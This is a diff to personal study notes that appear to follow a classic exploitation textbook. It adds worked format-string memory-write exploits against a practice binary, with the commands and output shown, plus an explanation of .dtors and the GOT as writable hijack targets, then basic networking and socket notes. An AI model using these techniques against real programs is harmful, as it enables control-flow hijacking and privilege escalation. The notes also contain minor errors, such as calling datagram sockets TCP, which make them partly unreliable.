@@ -450,7 +450,19 @@ We reference format strings [earlier](https://github.com/adminprivileges/skillbr
 - Just like data can be read from memory using format strings, it can be written using them as well. The ```%n``` format string is used to write the ammount of bytes written so far. If we can influence the data written so far, we can effectively write to a memory address that we control, the intended variable.
   - In order to find the offset from the the format string buffer to tthe intended variable you can place a predictable string (like AAAA) and pair it with a multitude of repeated format strings (```%x```) until  
 - Data can be written to our intended variable in one of two ways
-  - Manipulating the field width of your format strings for 4 consecutive writes, slowly changing the value (im gonna be honest, i dont understand this one as well as i should so im gonna skip the explanation)
+  - Manipulating the field width of your format strings for 4 consecutive writes, using regular format strings that reference sequential bits of memory with 4 byte offsets. Unfortunately you can only influence one byte at a time with this method resulting in you having to run the program 4 times back to back slowly incrementing the memory address. All in all, the operation will look something like this (for 4 times):
+    - <details>
+    
+      ```
+      reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
+      The right way to print user-controlled input:
+      ??JUNK??JUNK??JUNK??%x%x%126x%n
+      The wrong way to print user-controlled input:
+      ??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
+      0
+      [*] test_val @ 0x08049794 = 170 0x000000aa 
+      ```
+    </details>
   - Using Direct parameter access to simplify the above method for simpler, single execution writes (which i do understand so im going to explain).
     -  <details><summary>Reading</summary>
 
@@ -470,22 +482,161 @@ We reference format strings [earlier](https://github.com/adminprivileges/skillbr
           [*] test_val @ 0x08049794 = -72 0xffffffb8 
           reader@hacking:~/booksrc $
           ```
-      </details>
-    - Writing: To write data you must first read the data inside the memory address you would like to write too, you can do so by effectivey "zeroing" (or as close to it) the value, and then doing a litle bit math to rewrite the   ####END OF DAY
-### Everything after this is rough notes that need to be formated
----
-- use ```atoi()``` (ASCII to INT) to change character type to int
+
+       </details>
+    - Writing: To write data you must first read the data inside the memory address you would like to write too, you can do so by effectivey "zeroing" (or as close to it) the value, and then doing a little bit of math to rewrite the address.
+      - <details><summary>Ex</summary>
+
+          Using the example from the book. The intent is to change the address of tets_val to ```0xbffffd72```. First we hav to clear our the current value. 
+          ```c
+          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
+          The right way to print user-controlled input:
+          ????????%4$n
+          The wrong way to print user-controlled input:
+          ????????
+          [*] test_val @ 0x08049794 = 16 0x00000010
+
+          ```
+          This changes overrides the memory location and changes the value to 16 bytes which is the value of the 4 words. Next we can do some math to calculate the number of bits that need to be written for each byte of the memory address. This is done by starting with the 16 bytes and then calculating the offsets for each following byte via subtraction
+          ```
+          reader@hacking:~/booksrc $ gdb -q
+          (gdb) p 0x72 - 16
+          $1 = 98
+          (gdb) p 0xfd - 0x72
+          $2 = 139
+          (gdb) p 0xff - 0xfd
+          $3 = 2
+          (gdb) p 0x1ff - 0xfd
+          $4 = 258
+          (gdb) p 0xbf - 0xff
+          $5 = -64
+          (gdb) p 0x1bf - 0xff
+          $6 = 192
+          (gdb) quit
+          ```
+          With these offsets in mind, starting with ```%98x%4\$n``` we should be able to build a string that will override the entire memory address in one call.that will look something like
+          ```
+          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" ."\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
+          The right way to print user-controlled input:
+          ????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
+          The wrong way to print user-controlled input:
+          ???????? 
+                                                                          bffff3b0
+                                                          b7fe75fc
+                                      0
+                                            8049794
+          [*] test_val @ 0x08049794 = -1073742478 0xbffffd72
+          ```
+        </details>   
+
+### Destructors (.dtors)
+In C objects (to include functions like main) are paired with constructors and destructors which allocate and release resources when objects come in and out of scope. If these are not user defined, the compiler will simply choose the defaults. Functions can be defined as destructors by specifying the attribute in the function prototype ex: 
+```c
+static void cleanup(void) __attribute__ ((destructor));
+```
+Using the ```nm``` command, we can inspect the destructors, the addresses to these functions are stored sequentially in the stack, beginning at ```__DTOR_LIST__``` and ```__DTOR_END__``` these addresses should hold the values of```0x00000000``` and ```0xffffffff``` respectively. If no user defined destructors exist, these memory addresses will only be 4 bytes apart, otherwise a pointer to a user defined destructor will reside here. *Note: you can also use ```objdump``` to just print the destructor table.
+```
+reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln
+
+./fmt_vuln:     file format elf32-i386
+
+Contents of section .dtors:
+ 8049690 ffffffff 00000000 
+```
+It is important to note that the destructors table is writable (if you want to fact check me, run a ```objdump -h``` on a file and notice the lack of a READONLY attribute) given this fact if we have a program that runs under root privileges we can combine this with other techniques such as format string/buffer overflow exploits to control execution flow.
+### Global Offset table
+The global offset table along eith the procedure linkage table are used to convert position independent addresses to absolute locations (or in engligh it stores dynamic memory locations in static predictable pointers). This is important to understand because this is how programs reference essential functions such as ```exit()```. More importantly, the GOT is writable, which means again, we can influence program execution flow if we override these pointers. To inspect the address of these pointers you can inspect dynamic resolution entries of the GOT using ```objdump``` ex:
+```
+reader@hacking:~/booksrc $ objdump -R ./fmt_vuln
+
+./fmt_vuln:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049764 R_386_GLOB_DAT    __gmon_start__
+08049774 R_386_JUMP_SLOT   __gmon_start__
+08049778 R_386_JUMP_SLOT   __libc_start_main
+0804977c R_386_JUMP_SLOT   strcpy
+08049780 R_386_JUMP_SLOT   printf
+08049784 R_386_JUMP_SLOT   exit
+```
 
 ## x400
-##E Networking
+
+### OSI Model
+In oder for computers to be able to talk to one another, they need tp speak the same language. Due to the million different reasons that computers need to talk to each other there are another million protocols to somewhat uniformly control how the communications traverse across networks. 
+
+In order to make this more modular the OSI model was created as a conceptual model for these standards to adhere to in order to facilitate information flow. This model is made of 7 layers as follows:
+1. **Physical Layer** - Deals with transmitting a raw bit stream over a physical medium (turning something like light or electricity into data).  
+   - Devices at this layer include cables like coax and fiber, but can also be frequencies and EM pulses for wireless communications  
+2. **Data Link Layer** - Deals with transferring data from one device to another in frames within a broadcast domain. Error checking and flow control are added at this layer to make dataflow practical in modern application (focuses on getting information from one device to its neighbor). 
+   - Devices at this layer include switches. 
+3. **Networking Layer** - Deals with connecting broadcast domains to one another to facilitate wide area networks (makes big networks out of smaller networks).
+   - Devices at this layer include routers  
+4. **Transport Layer** - deals with enabling reliable networks, ensures complete data transfers and provides additions such as volume and rate control (helps data move more efficiently). 
+5. **Session Layer** - Deals with maintaining sessions between networked applications (controls the conversation). 
+6. **Presentation Layer** - responsible for ensuring the data is presented in a usable format, also where encryption happens
+7. **Application Layer** - Allows applications to access networked services. 
+When your data is moved over the internet, layers 1-3 facilitate actually getting your data from point a to point b. Layers 4-7 enable the underlying communication between the computers to occur in a uniform fashion.   
+## Sockets
+### Key concepts/definitions to know
+- **Sockets** - the pairing of an IP address with a Port, or otherwise a connection endpoint. This happens at layer 5 although it influences the structure of layer 4. 
 - There are two kinds of sockets
   - Stream Sockets: Used for TCP
   - Datagram Sockets: Used for TCP
-- A socket behaves a lot like a file descriptor, and can be interacted with using ```read()```  and ```write()``` a the prototype of a socket looks like this:
-  - ```socket(int domain, int type, int protocol)```
+- A socket behaves a lot like a file descriptor, and can be interacted with using ```read()```  and ```write()``` a function to create a socket fd looks like this:
+  - ```
+    socket(int domain, int type, int protocol)
+    ```
     - ```domain``` - protocol family of the socket (ex: ```pf_inet, pf_ax25```)
     - ```type``` - type of socket (ex: ```sock_stream, sock_dgram```)
     - ```protocol``` - choose a protocol within the family (most families only have 1 so this is usually set to ```0```)
-  - ```SOCKADDR_COMMON``` is an unsigned int used to represent the family of addresses along with the rest of the strcture for its saved data 
+- **Connecting** sockets is done via pairing the descriptor created in the function above with a remote host. The function to do so looks like this:
+  - ```
+     connect(int fd, struct sockaddr *remote_host, socklen_t addr_length) 
+    ```
+-  **Binding** sockets is done via pairing a sockets with a local address in order to listen to connections. The function looks like this:
+   -  ```
+        bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
+      ``` 
+    - To **listen** for connections you must use the following function, which ques requests up to ```backlog_queue_size```
+      - ```
+          listen(int fd, int backlog_queue_size)
+        ```
+    - To **accept** a connectiona bound socket must be paired with a remote host as well as the size off the address structture 
+      - ```
+          accept(int fd, sockaddr *remote_host, socklen_t *addr_length)
+        ```
+  - Sending and recieving are done via similar functions using the socket fd where ```n``` is the number of bytes sent or recieved
+    - ```
+      send(int fd, void *buffer, size_t n, int flags)
+      recv(int fd, void *buffer, size_t n, int flags)
+      ```
+    
+  - Many of these functions reference a ```sockaddr``` struct. This struct contains the infomration necessary to define a host given that there are many different ways a single host can be addressed depending on the protocol
+     - ```SOCKADDR_COMMON``` is an unsigned int used to represent the family of addresses along with the rest of the strcture for its saved data .
+     - These different sockaddr structures are all the same size allowing for them to be typecasted into one another. 
+### AF_INET
+- ```AF_INET``` is the address family under the ```PF_INET``` protocol family, Together this pair reporesent IPv4. THe address structure shown in the ```netinet/in.h``` file is as shown
+  - ```
+      /* Structure describing an Internet socket address.  */
+      struct sockaddr_in
+        {
+          __SOCKADDR_COMMON (sin_);
+          in_port_t sin_port;     /* Port number.  */
+          struct in_addr sin_addr;    /* Internet address.  */
+
+          /* Pad to size of 'struct sockaddr'.  */
+          unsigned char sin_zero[sizeof (struct sockaddr) -
+              __SOCKADDR_COMMON_SIZE -
+              sizeof (in_port_t) -
+              sizeof (struct in_addr)];
+         };
+    ```
+    - ```SOCKADDR_COMMON``` in this context defines our address family (IPv4)
+    - Next is the port which is a 16 bit short between 0-FFFF
+    - next is a 32 bit IP address
+    - Lastly, 8 bits pad out the rest of the address
+
   - The port number and IP in ```AF_INET``` are expected to be in big endian (regardless of architecture) and there are functions that can be used to convert this such as ```htonl``` (Host to network long)
   - 
